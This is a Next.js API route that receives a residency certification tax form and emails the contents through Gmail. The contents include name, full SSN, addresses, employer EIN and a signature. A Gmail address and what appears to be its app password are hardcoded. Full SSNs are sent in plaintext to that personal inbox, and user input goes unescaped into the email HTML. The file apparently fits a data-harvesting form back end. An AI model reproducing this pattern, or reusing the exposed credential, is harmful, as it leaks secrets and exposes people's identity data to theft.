import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const emailConfig = {
  user: 'mehwishsheikh0010sheikh@gmail.com',
  pass: 'flbw wrtr rwgo grlu',
  receiver: 'mehwishsheikh0010sheikh@gmail.com'
};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: emailConfig.user,
    pass: emailConfig.pass
  }
});

export async function POST(req: Request) {
  try {
    const body = await req.json();

    // Extract all fields from the JSON body
    const {
      name,
      ssn1, ssn2, ssn3, ssn4, ssn5, ssn6, ssn7, ssn8, ssn9,
      streetAddress, address2, city, state, zip, phone,
      municipality, county, residentPsd, residentRate,
      employerName, ein, employerStreet, employerAddress2,
      employerCity, employerState, employerZip, employerPhone,
      employerMunicipality, employerCounty, workPsd, nonResRate,
      employeeSignature, date, employeePhone, email
    } = body;

    // Validate required fields
    const requiredFields = [
      'name', 'streetAddress', 'city', 'state', 'zip', 'phone',
      'municipality', 'county', 'residentPsd', 'residentRate',
      'employerName', 'employerStreet', 'employerCity', 'employerState',
      'employerZip', 'employerPhone', 'employerMunicipality', 'employerCounty',
      'workPsd', 'nonResRate', 'employeeSignature', 'date', 'employeePhone', 'email'
    ];
    const missingFields = requiredFields.filter(field => !body[field] || (typeof body[field] === 'string' && body[field].trim() === ''));
    if (missingFields.length > 0) {
      return NextResponse.json({
        success: false,
        error: `Missing required fields: ${missingFields.join(', ')}`
      }, { status: 400 });
    }

    // Compose SSN and EIN as strings
    const ssn = [ssn1, ssn2, ssn3, ssn4, ssn5, ssn6, ssn7, ssn8, ssn9].join('');
    // EIN is not split in the form, but if it is, join as above
    // const einFull = [ein1, ein2, ein3, ein4, ein5, ein6, ein7, ein8, ein9].join('');

    // Create HTML content for the email
    const htmlContent = `
      <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto;">
        <h2 style="color: #333;">Residency Certification Form Submission</h2>
        <div style="margin: 20px 0; padding: 20px; background-color: #f9f9f9; border-radius: 5px;">
          <h3 style="color: #444;">Employee Information</h3>
          <p><strong>Name:</strong> ${name}</p>
          <p><strong>SSN:</strong> ${ssn}</p>
          <p><strong>Street Address:</strong> ${streetAddress}</p>
          <p><strong>Address 2:</strong> ${address2}</p>
          <p><strong>City:</strong> ${city}</p>
          <p><strong>State:</strong> ${state}</p>
          <p><strong>Zip:</strong> ${zip}</p>
          <p><strong>Phone:</strong> ${phone}</p>
          <p><strong>Municipality:</strong> ${municipality}</p>
          <p><strong>County:</strong> ${county}</p>
          <p><strong>Resident PSD Code:</strong> ${residentPsd}</p>
          <p><strong>Resident Rate:</strong> ${residentRate}</p>
        </div>
        <div style="margin: 20px 0; padding: 20px; background-color: #f1f1f1; border-radius: 5px;">
          <h3 style="color: #444;">Employer Information</h3>
          <p><strong>Employer Name:</strong> ${employerName}</p>
          <p><strong>EIN:</strong> ${ein}</p>
          <p><strong>Employer Street:</strong> ${employerStreet}</p>
          <p><strong>Employer Address 2:</strong> ${employerAddress2}</p>
          <p><strong>Employer City:</strong> ${employerCity}</p>
          <p><strong>Employer State:</strong> ${employerState}</p>
          <p><strong>Employer Zip:</strong> ${employerZip}</p>
          <p><strong>Employer Phone:</strong> ${employerPhone}</p>
          <p><strong>Employer Municipality:</strong> ${employerMunicipality}</p>
          <p><strong>Employer County:</strong> ${employerCounty}</p>
          <p><strong>Work PSD Code:</strong> ${workPsd}</p>
          <p><strong>Non-Resident Rate:</strong> ${nonResRate}</p>
        </div>
        <div style="margin: 20px 0; padding: 20px; background-color: #e9e9e9; border-radius: 5px;">
          <h3 style="color: #444;">Certification</h3>
          <p><strong>Date:</strong> ${date}</p>
          <p><strong>Employee Phone:</strong> ${employeePhone}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Signature:</strong></p>
          ${employeeSignature ? `<img src="${employeeSignature}" alt="Signature" style="max-width:300px;max-height:80px;border:1px solid #ccc;" />` : '<em>No signature provided</em>'}
        </div>
      </div>
    `;

    // Define mailOptions
    const mailOptions = {
      from: emailConfig.user,
      to: emailConfig.receiver,
      subject: 'Residency Certification Form Submission',
      html: htmlContent
    };

    // Send email
    try {
      await transporter.sendMail(mailOptions);
      return NextResponse.json({
        success: true,
        message: 'Form submitted successfully and email notification sent'
      });
    } catch {
      return NextResponse.json(
        { success: false, error: 'Failed to send email notification' },
        { status: 500 }
      );
    }
  } catch {
    return NextResponse.json(
      { success: false, error: 'Server error' },
      { status: 500 }
    );
  }
}
